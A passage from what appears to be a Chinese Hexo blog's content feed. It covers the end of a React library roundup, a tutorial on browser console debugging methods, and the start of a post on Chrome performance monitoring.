data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622548861-c18e9673-9685-4dfb-a5f0-d41ee3db7857.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）React Use</strong><br />React Use 是一个必不可少的 React Hooks 集合。其包含了传感器、用户界面、动画效果、副作用、生命周期、状态这六大类的 Hooks。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622548858-c93d03eb-4b72-4f1b-b313-fd219482e5c9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622548858-c93d03eb-4b72-4f1b-b313-fd219482e5c9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）useHooks</strong><br />useHooks 是一组易于理解的 React Hook 集合。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622619158-bba9fbc2-2dd9-404f-bfc6-a4ac782207cd.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622619158-bba9fbc2-2dd9-404f-bfc6-a4ac782207cd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>16、服务端渲染</strong><br /><strong>（1）Next.js</strong><br />Next.js 是一个用于服务器渲染的通用 JavaScript Web 应用程序的小型框架，该框架基于 React、Webpack 和 Babel 构建，为该网站提供了强大的支持。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659621913376-e477fa98-3c6c-4901-b91f-07f07e3baa48.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659621913376-e477fa98-3c6c-4901-b91f-07f07e3baa48.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）Razzle</strong><br />Razzle 是类似于 next.js 的简单服务端框架，用于在服务端渲染 React 应用程序。比较方便的一点是无需配置。通过将一般的 JavaScript 应用抽象成单个的依赖，然后将框架，路由和数据提取出来。同时，Razzle 支持可插拔渲染。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622042021-e310bd26-437d-43a1-842a-93e9d266097d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622042021-e310bd26-437d-43a1-842a-93e9d266097d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>17、拖拽排序</strong><br /><strong>（1）React Beautiful Dnd</strong><br />react-beautiful-dnd 是一款美观且简单易用的 React 列表拖拽库。其动画效果自然，性能优秀，简洁而强大的 API，易于上手，与标准浏览器的互动性非常好。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1659622363765-7be10003-191f-407b-8468-48870f82899c.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1659622363765-7be10003-191f-407b-8468-48870f82899c.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）React DnD</strong><br />React DnD 是 React 和 Redux 核心作者 Dan Abramov 创造的一组 React 高阶组件，可帮助我们构建复杂的拖放界面，同时保持组件解耦。它可以在应用程序的不同部分之间通过拖动传输数据，并且组件会更改其外观和应用状态以响应拖放事件。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622410709-79d963e3-7d2c-4724-9cd5-c0a4c150ee33.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622410709-79d963e3-7d2c-4724-9cd5-c0a4c150ee33.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）React Draggable</strong><br />React-Draggable 库简单易用，将 CSS 中的 transform 应用于 React 组件，允许我们在 UI 中拖动组件。它有不同的 props 可以让你改变组件的行为，是创建直观、用户友好界面的绝佳选择。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1659622440946-bcf078ea-7c9b-4e03-b2b0-f815bf7efc52.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1659622440946-bcf078ea-7c9b-4e03-b2b0-f815bf7efc52.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>18、国际化</strong><br /><strong>（1）React Intl</strong><br />React Intl 提供了一个 React 组件和用于国际化 React Web 应用的 Mixin。它提供一个格式化日期、数字、字符串消息的描述方式。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622204634-fa5e8142-b1b3-4b07-941b-ee081a71d9c3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622204634-fa5e8142-b1b3-4b07-941b-ee081a71d9c3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）React-i18next</strong><br />react-i18next 是基于 i18next 的一款强大的国际化框架，可以用于 react 和 react-native 应用，是目前非常主流的国际化解决方案。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622267896-9b8a351e-3b6a-4bb6-9c9d-8b96043b1bef.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622267896-9b8a351e-3b6a-4bb6-9c9d-8b96043b1bef.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>19、其他</strong><br /><strong>（1）Reactide</strong><br />Reactide 是首个用于 React Web 应用开发的专用 IDE 。它是一个跨平台的桌面应用程序，提供了一个自定义模拟器，不需要构建工具和服务器配置，开箱即用。 Reactide 将开发带回到打开单个文件的日子，立即在浏览器中呈现项目。 使用 Reactide，开发人员可以使用单个 React JSX 文件实现相同的简单性，同时利用 React 的强大功能。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659601981425-37c0edc9-f522-441a-b212-67215f5e92aa.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659601981425-37c0edc9-f522-441a-b212-67215f5e92aa.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）Gatsby</strong><br />Gatsby 是基于 React 构建的静态站点生成器，拥有丰富的插件生态，其主要目标之一是交付访问速度快速的网页，它通过利用良好的缓存、静态页面生成和基于边缘的 CDN 数据源来实现这一目标。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659621812138-36b47366-46e3-4ffd-924b-02ff10f370c9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659621812138-36b47366-46e3-4ffd-924b-02ff10f370c9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）React Helmet</strong><br />React Helmet 是一个 HTML 文档 head 管理工具，管理对文档头的所有更改。Helmet 采用纯 HTML 标签并输出纯 HTML 标签。它非常简单，而且对 React 初学者友好。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659621458775-7e031028-b8db-4dd5-bafd-937cfaa4e617.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659621458775-7e031028-b8db-4dd5-bafd-937cfaa4e617.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
            <tag> 收藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>console 调试技巧</title>
      <link href="/2021/06/20/frontend/browser/debug/console-diao-shi-ji-qiao/"/>
      <url>/2021/06/20/frontend/browser/debug/console-diao-shi-ji-qiao/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="df368884"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>如果统计一番前端最常用的方法，那么 console.log 一定位列其中。无论你写的是原生 JS 亦或者是 JQuery、Vue 等等，调试之时，都离不开 console.log 方法。但是，console 对象中的方法不仅仅只有 log 方法。强大的 console 对象提供了大量控制台调试的相关方法，掌握这些方法可以大大方便你的调试，甚至做出一些炫酷的控制台字符画。</p><p><a name="864de167"></a></p><h3 id="基本输出"><a href="#基本输出" class="headerlink" title="基本输出"></a>基本输出</h3><p>console 对象最基础的方法毫无疑问是 log，该方法会直接在控制台上输出参数，如果输入多个参数，那么输出在控制台上的参数用空格分隔，如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;World&#x27;</span>);</span><br></pre></td></tr></table></figure><p>打开控制台，运行结果如下图所示：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1551369005139-babaae29-8209-473d-895f-42e9c7eccb74.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1551369005139-babaae29-8209-473d-895f-42e9c7eccb74.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>console.log 还含有类似于 Python 的占位符功能，但是，个人认为该功能可以完全被 ES6 中的字符串模板完全替代，有兴趣的可以去了解，在此不再赘述。</p><p><a name="2da6f345"></a></p><h3 id="分类输出"><a href="#分类输出" class="headerlink" title="分类输出"></a>分类输出</h3><p>厌倦了 console.log 单调的输出？欢迎尝试 console 对象的分类输出功能。console 对象提供了 info、warn、error 方法分别输出提示、警告以及错误信息。<br />我们输入下面这段代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;log&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;info&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&#x27;warn&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br></pre></td></tr></table></figure><p>结果如下图所示：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1551369026448-a85fdb63-f7a5-4832-bf70-d5ed63f09ab8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1551369026448-a85fdb63-f7a5-4832-bf70-d5ed63f09ab8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>可以发现，warn 和 error 方法分别输出了一条警告和一条错误信息。但是，为什么 log 方法和 info 方法输出是一样的呢？<br />原因在于，我使用的是 Chrome 浏览器，在 Chrome 浏览器上，log 方法和 info 方法的表现是一样的。但是，在其他浏览器上，比如 FireFox，info 方法前面会有一个信息图标。<br />由于 info 方法的效果不明显，并且各个浏览器中效果有差异，所以一般情况下，我们使用 log 方法代替 info 方法。</p><p><a name="2fda7b0d"></a></p><h3 id="断言输出"><a href="#断言输出" class="headerlink" title="断言输出"></a>断言输出</h3><p>console 对象提供了类似于单元测试中的断言的方法：assert。该方法接收两个参数，第一个参数为断言条件，第二个参数代表断言信息。<br />同单元测试断言一样，当断言条件为 true 时，assert 无输出；只有当断言条件为 false 时，assert 方法才会在控制台中输出一条断言错误信息。<br />我们输入以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">assert</span>(<span class="literal">true</span>, <span class="string">&#x27;true&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">assert</span>(<span class="literal">false</span>, <span class="string">&#x27;false&#x27;</span>);</span><br></pre></td></tr></table></figure><p>控制台如下所示：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1554739550794-94b609f3-1804-4015-892b-317582fe5b7f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1554739550794-94b609f3-1804-4015-892b-317582fe5b7f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="assert.png"></p><p>可以发现，控制台只输出了那一条断言条件为 false 的语句。</p><p><a name="6ec21063"></a></p><h3 id="分组输出"><a href="#分组输出" class="headerlink" title="分组输出"></a>分组输出</h3><p>当你的控制台上输出了大量信息时，控制台会显得极其杂乱，你甚至不知道某一条信息是哪条代码输出的。此时，console 对象的 group 以及 groupEnd 方法可以拯救你。<br />将部分 console 语句放入 group 与 groupEnd 之间，可以形成将这部分 console 语句划定为一组信息进行输出。其中，group 方法接收一个字符，作为分组名称，groupEnd 方法不接收参数用于结束分组。<br />输入以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">group</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;1-1&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&#x27;1-2&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;1-3&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">groupEnd</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">group</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;2-1&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&#x27;2-2&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;2-3&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">groupEnd</span>();</span><br></pre></td></tr></table></figure><p>结果如图所示：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1551369059602-5b6c8e42-b7e6-47cd-92ca-82f17c99b109.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1551369059602-5b6c8e42-b7e6-47cd-92ca-82f17c99b109.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>通过点击分组的箭头，可以折叠分组，方便归纳整理控制台信息，避免控制台被海量信息淹没。</p><p><a name="8756f96b"></a></p><h3 id="表格输出"><a href="#表格输出" class="headerlink" title="表格输出"></a>表格输出</h3><p>我们不仅可以将控制台信息分组输出，我们还可以将其以表格的形式输出。<br />console 的 table 方法可以将一个对象以表格的形式输出，当输入的参数不是对象时，此时，table 方法相当于 log 方法。<br />输入以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">value</span>: <span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">b</span>: &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">value</span>: <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">table</span>(obj);</span><br></pre></td></tr></table></figure><p>控制台如图所示：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1551369104176-b8364314-4b8f-4394-a319-32fcf5eb2d62.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1551369104176-b8364314-4b8f-4394-a319-32fcf5eb2d62.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>控制台不仅以表格形式输出了对象，还以基础输出的方式输出了对象以方便查看信息。</p><p><a name="0e0b2800"></a></p><h3 id="计次输出"><a href="#计次输出" class="headerlink" title="计次输出"></a>计次输出</h3><p>在日常开发中，有一个常见的调试需求——计算一段代码的执行次数。一般来说，我们会在这段代码中定义一个变量，每执行一次它就进行一次自增，并通过 console.log 方法输出该变量。<br />可以看出，上述的方法略显麻烦，可不可以一行代码就解决这个问题呢？当然可以！count 方法，你值得拥有。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">count</span>(<span class="string">&quot;num&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">count</span>(<span class="string">&quot;num&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">count</span>(<span class="string">&quot;anotherNum&quot;</span>);</span><br></pre></td></tr></table></figure><p>结果如下图所示：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1551369126613-bb2fcde7-e59a-4ad3-8bc0-7621ea3ac25f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1551369126613-bb2fcde7-e59a-4ad3-8bc0-7621ea3ac25f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>可以发现，count 方法通过输入的字符串区分不同的计数语句。</p><p><a name="5ec5f672"></a></p><h3 id="计时输出"><a href="#计时输出" class="headerlink" title="计时输出"></a>计时输出</h3><p>当测试算法性能时，我们通常使用时间复杂度来评价算法的性能，但是，时间复杂度哪里有代码执行时间来的直观呢？<br />在之前不了解 console 对象的时候，我们在算法的头尾分别获取时间戳，取时间戳的差值作为代码执行时间。很明显，这种方法太过繁琐。<br />使用 console 对象的 time 以及 timeEnd 方法可以计算出代码执行时间。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">time</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>;i++) &#123;</span><br><span class="line">    sum += i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">timeEnd</span>(<span class="string">&#x27;time&#x27;</span>);</span><br></pre></td></tr></table></figure><p>结果如下图所示：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1551369146285-3964aeb0-8dea-4c22-b108-59efe8386548.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/png/272053/1551369146285-3964aeb0-8dea-4c22-b108-59efe8386548.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="9415a826"></a></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>除了上述的方法，cnosole 方法还有很多强大的方法，比如：dir、debug、trace 等，但是它们有的在 Chrome 效果不佳，有的能被 Chrome debugger 完美替代，所以，在此不再赘述。如果有兴趣，可以进一步了解。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
          <category> 调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chrome 性能监测</title>
      <link href="/2021/04/11/frontend/browser/debug/chrome-xing-neng-jian-ce/"/>
      <url>/2021/04/11/frontend/browser/debug/chrome-xing-neng-jian-ce/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>前端性能优化一直是前端工作中必不可少的一部分，但是我们如何知道哪些部分的性能有优化的空间呢？此时，Chrome 性能监测就派上用场了。</p><p>正所谓：知己知彼，百战百胜，只有确定了性能瓶颈，才能有条不紊地进行前端性能优化工作。</p><p><a name="Performance"></a></p><h3 id="Performance"><a href="#Performance" class="headerlink" title="Performance"></a>Performance</h3><p>Performance 是 Chrome 开发者工具中的一个功能，用于记录网页从初始化到运行时的所有性能指标。</p><p>使用 Performance 之前，我们需要先打开 Chrome 的无痕模式，因为，身为开发者，Chrome 上一般都有着大量的 Chrome 插件，而 Chrome 插件会显著影响页面的性能。所以，我们需要进入无痕模式来规避 Chrome 插件对页面性能的影响。</p><p>进入无痕模式后，我们打开需要进行性能监测的网站，开启 Chrome 开发者工具，点击 Performance 选项卡，进入面板。此时的面板什么都没有，只有几个操作提示。</p><p>接下来，我们点击左上角的 Record（小圆点）按钮，Performance 进入 Record 阶段，从此刻开始，它会记录用户的交互以及这些交互对页面性能数据的影响。当交互完成后，点击 Stop 来停止 Record ，Performance 面板会展示出刚才录制的页面性能数据。如下所示：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/jpeg/272053/1555237392439-f5416a63-ec9f-4a29-bee0-573cbd2810df.jpeg" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/jpeg/272053/1555237392439-f5416a63-ec9f-4a29-bee0-573cbd2810df.jpeg" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="performance总览.jpg"></p><p>拿到 Performance 性能报告，首先，我们先看顶部的三个数据：FPS、CPU 以及 NET。</p><ol><li>FPS：主要和动画性能有关，代表每秒帧数。图表中的绿色长条越高，说明 FPS 越高，用户体验越好。如果其中有红色长条，代表着这部分帧数有卡顿，需要优化。</li><li>CPU：和底部的 Summary 对应，显示了页面加载过程中，各阶段对 CPU 的占用时间，占用时间越多，代表该阶段越需要优化。在 Performance 中，该部分是最需要关注的指标之一。</li><li>NET：主要展示了网络请求的先后顺序以及各自的请求耗时，可以被 Network 面板完美替代，建议直接查看 Network。</li></ol><p>接下来，我们来了解一下最杂乱的中间部分，一般情况下，我们主要根据中间部分中 Main 的图表来分析页面性能。</p><p>由于 Main 的图表长得像一团团倒立的火焰，所以，我们将其称为火焰图。它展现了主线程在 Record 过程中做的所有事情，包括：Loading、Scripting、Rendering、Painting 等等。火焰图的横轴代表着时间，纵轴代表着调用堆栈。每一个长条代表执行了一个事件或函数，长条的长度代表着耗时的长短，如果某个长条右上角是红色的则表示该函数存在性能问题，需要重点关注。</p><p>活用 Performance，按照 Chrome 的提示进行优化，可以解决掉绝大部分的性能问题。</p><p><a name="23ab71fd"></a></p><h3 id="Performance-monitor"><a href="#Performance-monitor" class="headerlink" title="Performance monitor"></a>Performance monitor</h3><p>看起来，Performance 